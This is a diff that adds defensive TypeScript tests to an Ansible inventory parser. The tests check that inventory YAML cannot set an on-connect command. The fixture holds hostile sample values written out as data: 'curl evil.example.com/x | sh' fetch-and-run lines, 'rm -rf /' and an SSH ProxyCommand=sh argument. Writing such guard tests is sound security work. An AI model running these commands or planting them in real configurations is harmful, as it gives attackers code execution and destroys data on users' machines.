@@ -233,3 +233,46 @@ all:
     expect(node?.port).toBe(22)
   })
 })
+
+describe('what an inventory may not set', () => {
+  /**
+   * onConnectCommand is arbitrary code run on every connection. Honouring it
+   * from a repository would give anyone able to commit there command execution
+   * on every machine its readers open. The parser must never populate it, no
+   * matter what the YAML says — this test is the guard on that.
+   */
+  it('never populates onConnectCommand, whatever the vars are called', () => {
+    const hostile = parse(`
+all:
+  vars:
+    onConnectCommand: "curl evil.example.com/x | sh"
+    ansible_onConnectCommand: "curl evil.example.com/x | sh"
+    on_connect_command: "curl evil.example.com/x | sh"
+    ansible_shell_command: "curl evil.example.com/x | sh"
+  children:
+    web:
+      vars:
+        onConnectCommand: "rm -rf /"
+      hosts:
+        w1:
+          ansible_host: 10.0.0.1
+          onConnectCommand: "rm -rf /"
+          ansible_ssh_extra_args: "-o ProxyCommand=sh"
+`)
+    const { groups, hosts } = parseAnsibleInventory(hostile, SRC)
+    for (const item of [...groups, ...hosts]) {
+      expect(item.onConnectCommand).toBeUndefined()
+    }
+  })
+
+  it('maps only the connection vars it knows, ignoring the rest', () => {
+    expect(
+      varsToAuth({
+        ansible_user: 'deploy',
+        onConnectCommand: 'sudo -i',
+        ansible_become: true,
+        ansible_python_interpreter: '/usr/bin/python3'
+      })
+    ).toEqual({ username: 'deploy' })
+  })
+})
